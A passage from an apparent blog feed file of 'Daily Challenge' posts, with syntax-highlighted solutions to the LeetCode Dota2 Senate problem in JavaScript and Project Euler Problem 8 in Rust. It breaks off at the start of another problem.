which near him most but behind it. If no opponent is behind it, then the best choice is ban the front unbanned opponent.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;string&#125; senate</span></span><br><span class="line"><span class="comment"> * @return &#123;string&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> predictPartyVictory = <span class="function">(<span class="params">senate</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> q = [];</span><br><span class="line">  <span class="keyword">let</span> banQ = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> banR = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">const</span> s <span class="keyword">of</span> senate)&#123;</span><br><span class="line">    q.push(s);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> last_round_len;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    last_round_len = q.length;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; last_round_len; ++i)&#123;</span><br><span class="line">      <span class="keyword">const</span> tmp = q.shift();</span><br><span class="line">      <span class="keyword">if</span>(tmp === <span class="string">"R"</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(banR) --banR;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">          ++banQ;</span><br><span class="line">          q.push(tmp);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(banQ) --banQ;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">          ++banR;</span><br><span class="line">          q.push(tmp);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">while</span>(q.length != last_round_len);</span><br><span class="line">  <span class="keyword">return</span> (q[<span class="number">0</span>]===<span class="string">"R"</span>)?<span class="string">"Radiant"</span>:<span class="string">"Dire"</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2018-12-28 Daily Challenge</title>
      <link href="/2018-12-28-Daily-Challenge/"/>
      <url>/2018-12-28-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Largest product in a series</em> in <em>Rust</em> and <em>Magical String</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Largest product in a series</span><br><span class="line"></span><br><span class="line">Problem 8 </span><br><span class="line"></span><br><span class="line">The four adjacent digits in the 1000-digit number that have the greatest product are 9 × 9 × 8 × 9 = 5832.</span><br><span class="line"></span><br><span class="line">73167176531330624919225119674426574742355349194934</span><br><span class="line">96983520312774506326239578318016984801869478851843</span><br><span class="line">85861560789112949495459501737958331952853208805511</span><br><span class="line">12540698747158523863050715693290963295227443043557</span><br><span class="line">66896648950445244523161731856403098711121722383113</span><br><span class="line">62229893423380308135336276614282806444486645238749</span><br><span class="line">30358907296290491560440772390713810515859307960866</span><br><span class="line">70172427121883998797908792274921901699720888093776</span><br><span class="line">65727333001053367881220235421809751254540594752243</span><br><span class="line">52584907711670556013604839586446706324415722155397</span><br><span class="line">53697817977846174064955149290862569321978468622482</span><br><span class="line">83972241375657056057490261407972968652414535100474</span><br><span class="line">82166370484403199890008895243450658541227588666881</span><br><span class="line">16427171479924442928230863465674813919123162824586</span><br><span class="line">17866458359124566529476545682848912883142607690042</span><br><span class="line">24219022671055626321111109370544217506941658960408</span><br><span class="line">07198403850962455444362981230987879927244284909188</span><br><span class="line">84580156166097919133875499200524063689912560717606</span><br><span class="line">05886116467109405077541002256983155200055935729725</span><br><span class="line">71636269561882670428252483600823257530420752963450</span><br><span class="line"></span><br><span class="line">Find the thirteen adjacent digits in the 1000-digit number that have the greatest product. What is the value of this product?</span><br></pre></td></tr></table></figure><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Brute force is most gentle method ;D</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> arr: [<span class="built_in">i64</span>; <span class="number">1000</span>] = [<span class="number">7</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">0</span>];</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans: <span class="built_in">i64</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">0</span>..<span class="number">1000</span>-<span class="number">12</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut</span> tmp = arr[i];</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="number">1</span>..<span class="number">13</span>&#123;</span><br><span class="line">            tmp *= arr[i + j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> tmp &gt; ans &#123;</span><br><span class="line">            ans = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 